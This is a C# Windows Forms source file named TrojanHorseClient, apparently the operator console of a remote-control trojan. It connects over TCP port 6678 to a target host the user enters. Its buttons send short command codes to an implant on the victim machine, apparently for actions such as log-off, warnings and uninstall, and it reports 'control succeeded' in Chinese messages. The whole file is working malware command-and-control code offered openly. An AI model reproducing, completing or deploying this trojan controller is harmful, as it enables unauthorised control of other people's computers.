using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace TrojanHorseClient
{
    public partial class Form1 : Form
    {
        private TcpClient client;
        private NetworkStream stream;
        private Thread ssss;
        private string zhucex = "zx0000";
        private string zhuces = "zs0000";
        private string mumawe = "mw0000";
        private string jingga = "000000";
        private string jianyi = "000000";
        private string xiezai = "000000";
        private string control = "000000";

        public Form1()
        {
            InitializeComponent();
        }        
       
        public void receive()
        {

            byte[] bb = new byte[3];
            int i = stream.Read(bb, 0, 3);
            string ss = System.Text.Encoding.ASCII.GetString(bb);
            if (ss == "hjc")
            {
                MessageBox.Show("连接成功！");
                richTextBox1.AppendText("与" + textBox1.Text + "连接成功。" + "\r");
            }
            if (ss == "hkz")
            {
                richTextBox1.AppendText(control + "控制成功！" + "\r");
                MessageBox.Show(control + "控制成功！");
            }
        }

        private void ControlServer()
        {
            if (control == "000000")
            {
                MessageBox.Show("您没有选择任何控制目标！不发控制信号！");
                richTextBox1.AppendText("您没有选择任何控制目标！不发控制信号！" + "\r");
            }
            else if (control != "000000")
            {
                try
                {
                    richTextBox1.AppendText(control + "正在试图控制，等待回应......" + "\r");
                    stream = client.GetStream();
                    if (stream.CanWrite)
                    {


                        byte[] by = System.Text.Encoding.ASCII.GetBytes(control.ToCharArray());

                        stream.Write(by, 0, by.Length);
                        stream.Flush();
                        ssss = new Thread(new ThreadStart(receive));
                        ssss.Start();
                    }
                }
                catch
                {
                    richTextBox1.AppendText("服务器未连接！控制无效！" + "\r");
                    MessageBox.Show("服务器未连接！控制无效！" + "\r");
                }
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            richTextBox1.AppendText("请求连接" + textBox1.Text + "\r");
            int port = 6678;
            try
            {
                client = new TcpClient(textBox1.Text, port);

            }
            catch
            {
                MessageBox.Show("服务器不在线上！确定是否未输入主机名称。");
                richTextBox1.AppendText("服务器不在线上！确定是否未输入主机名称。" + "\r");
            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            richTextBox1.AppendText("测试连接" + "\r");
            try
            {
                stream = client.GetStream();
                if (stream.CanWrite)
                {
                    string control = "jiance";

                    byte[] by = System.Text.Encoding.ASCII.GetBytes(control.ToCharArray());

                    stream.Write(by, 0, by.Length);
                    stream.Flush();
                    ssss = new Thread(new ThreadStart(receive));
                    ssss.Start();
                }
            }
            catch (Exception ee)
            {
                richTextBox1.AppendText(ee.Message + "\r");
                MessageBox.Show(ee.Message);
            }
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            zhucex = "zx0100";
            control = zhucex;
            ControlServer();
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            zhuces = "zs0100";
            control = zhuces;
            ControlServer();
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            jingga = "jg0000";
            control = jingga;
            ControlServer();
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            jianyi = "jy0000";
            control = jianyi;
            ControlServer();
        }

        private void button7_Click_1(object sender, EventArgs e)
        {
            mumawe = "mw1000";
            control = mumawe;
            ControlServer();
        }

        private void button8_Click_1(object sender, EventArgs e)
        {
            xiezai = "xz0000";
            control = xiezai;
            ControlServer();
        }	
    }
}
